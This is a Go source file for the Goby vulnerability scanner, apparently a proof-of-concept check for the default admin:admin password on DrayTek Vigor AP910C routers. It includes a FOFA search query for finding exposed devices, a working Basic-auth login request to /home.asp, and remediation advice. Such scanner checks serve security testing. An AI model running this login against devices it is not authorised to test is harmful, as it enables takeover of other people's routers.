package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DrayTek Vigor AP910C Router Default Password Vulnerability",
    "Description": "<p>DrayTek Vigor AP910C is a wireless router product with firewall function launched by DrayTek.</p><p>Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.</p>",
    "Product": "DrayTek-Vigor-AP910C",
    "Homepage": "https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/",
    "DisclosureDate": "2023-03-06",
    "Author": "635477622@qq.com",
    "FofaQuery": "header=\"VigorAP910C\" || banner=\"VigorAP910C\"",
    "GobyQuery": "header=\"VigorAP910C\" || banner=\"VigorAP910C\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "DrayTek Vigor AP910C 路由器默认口令漏洞",
            "Product": "DrayTek-Vigor-AP910C",
            "Description": "<p>DrayTek Vigor AP910C 是 DrayTek 推出的一款带有防火墙功能的无线路由器产品。&nbsp;</p><p>攻击者可以通过默认密码 admin:admin 控制整个平台，并利用管理员权限操作核心功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令 admin:admin 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "DrayTek Vigor AP910C Router Default Password Vulnerability",
            "Product": "DrayTek-Vigor-AP910C",
            "Description": "<p>DrayTek Vigor AP910C is a wireless router product with firewall function launched by DrayTek.</p><p>Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
            "Impact": "<p>Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10832"
}`
	sendPayloadFlagMVGgg := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig("/home.asp")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
		payloadRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo)
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadFlagMVGgg(hostInfo)
			success := resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "AP910C")
			if success {
				ss.VulURL = hostInfo.Scheme() + "://admin:admin@" + hostInfo.HostInfo
			}
			return success
		}, nil,
	))
}
